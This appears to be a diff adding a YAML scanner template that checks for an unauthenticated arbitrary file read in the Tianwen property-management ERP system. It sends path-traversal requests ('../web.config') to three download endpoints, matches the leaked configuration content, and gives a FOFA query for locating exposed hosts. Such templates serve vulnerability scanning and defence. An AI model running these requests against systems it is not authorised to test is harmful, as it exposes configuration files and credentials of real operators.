@@ -1,0 +1,48 @@
+id: tianwen-erp-areaavatardownload-fileread
+
+info:
+  name: 天问物业ERP系统AreaAvatarDownLoad.aspx任意文件读取漏洞
+  author: avic123
+  severity: high
+  verified: true
+  description: |
+    天问物业ERP系统/HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
+    fofa：body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
+  reference:
+    - https://github.com/zeroChen00/exp-poc/blob/main/%E5%A4%A9%E9%97%AE%E7%89%A9%E4%B8%9AERP%E7%B3%BB%E7%BB%9F/%E5%A4%A9%E9%97%AE%E7%89%A9%E4%B8%9AERP%E7%B3%BB%E7%BB%9FAreaAvatarDownLoad.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  created: 2025/03/13
+
+set:
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config
+    expression: |
+      response.status == 200 && 
+      response.headers["content-disposition"].contains("web.config") &&
+      response.body.bcontains(b'<configuration>')&&
+      response.body.bcontains(b'PublicKeyToken=b77a5c561934e089')
+
+  r1:
+    request:
+      method: GET
+      path: /HM/M_Main/InformationManage/ContractDownLoad.aspx?ContractFile=../web.config
+    expression: |
+      response.status == 200 && 
+      response.headers["content-disposition"].contains("web.config") &&
+      response.body.bcontains(b'<configuration>')&&
+      response.body.bcontains(b'PublicKeyToken=b77a5c561934e089')
+  r2:
+    request:
+      method: GET
+      path: /HM/M_Main/WorkGeneral/docfileDownLoad.aspx?AdjunctFile=../web.config
+    expression: |
+      response.status == 200 && 
+      response.headers["content-disposition"].contains("web.config") &&
+      response.body.bcontains(b'<configuration>')&&
+      response.body.bcontains(b'PublicKeyToken=b77a5c561934e089')
+
+expression: r0() || r1() || r2()
